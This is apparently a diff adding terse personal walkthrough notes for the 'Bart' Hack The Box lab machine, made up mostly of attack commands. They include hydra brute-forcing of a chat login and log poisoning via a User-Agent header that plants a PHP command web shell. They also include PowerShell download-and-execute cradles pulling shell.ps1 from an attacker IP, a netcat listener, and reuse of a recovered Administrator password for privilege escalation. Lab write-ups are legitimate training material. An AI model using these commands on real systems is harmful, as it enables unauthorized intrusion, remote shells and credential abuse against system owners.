@@ -1,0 +1,74 @@
+feroxbuster find monitor
+
+guess harvey's password as harvey was hidden in the source code on forum (potter) on monitor
+
+- can try bruteforce but got csrf token so need to write your own script (see 0xdf writeup)
+
+
+
+find internal-01
+
+- either bruteforce (see ippsec) to get harvey's password - Password1
+
+Invalid Username or Password
+
+The Password must be at least 8 characters
+
+common word is Password, hence:
+
+hydra -l harvey -P ./list.txt internal-01.bart.htb http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=Login:Password"
+
+
+
+
+- or you can go to source code: https://github.com/magkopian/php-ajax-simple-chat/tree/master/simple_chat, and realise that there is a register form :)
+  
+  run: curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d "uname=abc&passwd=abcdefghijklm"
+
+
+Enumerate internal-01 or use gobuster to find log file
+
+http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey
+
+http://internal-01.bart.htb/log/log.txt
+
+curl -H "User-Agent: <?php phpinfo(); ?>" "http://internal-01.bart.htb/log/log.php?filename=mnb.php&username=harvey"
+
+http://internal-01.bart.htb/log/mnb.php
+
+curl -H "User-Agent: <?php system($_REQUEST['cmd']); ?>" "http://internal-01.bart.htb/log/log.php?filename=cmd.php&username=harvey"
+
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.70:81/shell.ps1')"
+
+
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  DESKTOP-7I3S68E
+    DefaultUserName               :  Administrator
+    DefaultPassword               :  3130438f31186fbaf962f407711faddb
+
+$SecPass = ConvertTo-SecureString '3130438f31186fbaf962f407711faddb' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
+
+
+on terminal 3 run sudo nc lvnp 443
+
+On terminal 2:
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.70/shell.ps1')" -Credential $cred
+
+powershell "$SecPass = ConvertTo-SecureString '3130438f31186fbaf962f407711faddb' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass); Start-Process "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.70/shell.ps1')" -Credential $cred"
+
+
+
+
+$pw='3130438f31186fbaf962f407711faddb'
+$username='BART\Administrator'
+$password = $pw | ConvertTo-SecureString -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password Invoke-Command -Computer localhost -Credential $cred -ScriptBlock { whoami }
+
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.70/shell.ps1')
+
+
+
+
+
+
